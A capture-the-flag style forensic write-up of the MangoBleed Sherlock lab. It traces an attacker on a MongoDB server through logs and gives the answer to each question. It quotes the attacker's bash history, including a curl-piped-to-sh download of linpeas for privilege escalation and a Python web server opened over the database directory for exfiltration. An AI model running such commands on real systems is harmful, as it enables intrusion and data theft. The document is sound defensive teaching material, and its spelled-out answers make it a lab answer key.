# MangoBleed

Find the Sherlock [here.](https://app.hackthebox.com/sherlocks/MangoBleed?tab=play_sherlock)

|Difficulty|Category|
|:--------:|:------:|
|Very Easy |  DFIR  |

**Skills learned:**
* Examining UAC artifacts during an investigation
* Log analysis to search for brute force and privilege escalation attempts

## Description
You were contacted early this morning to handle a high‑priority incident involving a suspected compromised server. The host, mongodbsync, is a secondary MongoDB server. According to the administrator, it's maintained once a month, and they recently became aware of a vulnerability referred to as MongoBleed. As a precaution, the administrator has provided you with root-level access to facilitate your investigation.

You have already collected a triage acquisition from the server using UAC. Perform a rapid triage analysis of the collected artifacts to determine whether the system has been compromised, identify any attacker activity (initial access, persistence, privilege escalation, lateral movement, or data access/exfiltration), and summarize your findings with an initial incident assessment and recommended next steps.

**File attachment(s):**
```text
MangoBleed.zip
└── uac-mongodbsync-linux-triage
    ├── bodyfile
    ├── hash_executables
    ├── live_response
    ├── [root]
    └── system
```

## Questions
**1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?**

The sherlock scenario tells us about a "vulnerability referred to as MongoBleed". Searching for this vulnerability online gives  us the CVE ID.

```text
MongoBleed (CVE-2025-14847) is a high-severity information disclosure vulnerability in MongoDB Server caused by improper handling of length parameters in zlib-compressed network messages.
```

**Answer: CVE-2025-14847**

---

**2. What is the version of MongoDB installed on the server that the CVE exploited?**

I had to research where to find package versions in UAC output. I found:
```text
UAC automatically collects information about installed packages. If MongoDB was installed via a standard repository (apt, yum, dpkg), the version is recorded here:
Path: [UAC_OUTPUT]/live_response/packages/
```

The file `uac-mongodbsync-linux-triage/live_response/packages/dpkg_-l.txt` provides the full listing of all packages installed along with their version. Searching for 'mongodb' in the list shows:
```text
mongodb-org-server        8.0.16         amd64       MongoDB database server
```

**Answer: 8.0.16**

---

**3. Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.**

The `uac-mongodbsync-linux-triage/live_response/system` contains useful log files to help us find the attacker's IP. The file **lastb_-a_-F_-f_var_log_btmp.txt** contains failed login attempts, including the username, timestamp and source IP. Logs inside this file include the following:

```text
mongoadm ssh:notty    Mon Dec 29 05:39:21 2025 - Mon Dec 29 05:39:21 2025  (00:00)     65.0.76.43
mongoadm ssh:notty    Mon Dec 29 05:39:21 2025 - Mon Dec 29 05:39:21 2025  (00:00)     65.0.76.43
mongoadm ssh:notty    Mon Dec 29 05:39:21 2025 - Mon Dec 29 05:39:21 2025  (00:00)     65.0.76.43
```

There are any failed login attempts for user *mongoadm* in a short timespan, all from the same IP address. We can assume this is the attacker IP.

**Answer: 65.0.76.43**

---

**4. Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)**

We can search the MongoDB operational logs inside the `uac-mongodbsync-linux-triage/[root]/var/log/mongodb/mongod.log` file to determine when exploitation began. Search the logs for the attacker's IP address and find the earliest confirmed malicious event.

```text
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"s":"I",  "c":"NETWORK",  "id":22943,   "ctx":"listener","msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340","isLoadBalanced":false,"uuid":{"uuid":{"$uuid":"099e057e-11c1-46ed-b129-a158578d2014"}},"connectionId":1,"connectionCount":1}}
```

**Answer: 2025-12-29 05:25:52**

---

**5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.**

Keeping the `mongod.log` file open in a text editor, we can use *Find all* logs containing the attacker's IP. Doing so will give us the answer.

**Answer: 75260**

---

**6. The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?**

The log file `uac-mongodbsync-linux-triage/[root]/var/log/auth.log` is most useful in determining when access was gained. We can again search for logs containing the attacker's IP and find logs accepting a connection.

```text
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:40:03.477802+00:00 ip-172-31-38-170 sshd[39962]: pam_unix(sshd:session): session opened for user mongoadmin(uid=1001) by mongoadmin(uid=0)
2025-12-29T05:40:03.486034+00:00 ip-172-31-38-170 systemd-logind[678]: New session 10 of user mongoadmin.
```

Here we find logs where the attacker's connection was accepted, the user they logged in as, and when their sshd session was opened.

**Answer: 2025-12-29 05:40:03**

---

**7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.**

At this point of our investigation, we already know that the attacker gained access through the **mongoadmin** user. We can find which commands were run as this user inside their **.bash_history** file: `uac-mongodbsync-linux-triage/[root]/home/mongoadmin/.bash_history`.

Printing the file contents we see output such as:

```text
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

[LinPEAs](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) is a well-known script to aid in privilege escalation on Linux machines.

**Answer: curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh**

---

**8. The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?**

Digging further into the `/mongoadmin/.bash_history` file, we can see the commands used to spawn a python web server:

```text
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
```

The python web server was spawed (`python3 -m http.server 6969`) inside the directory **/var/lib/mongodb**.

**Answer: /var/lib/mongodb/**
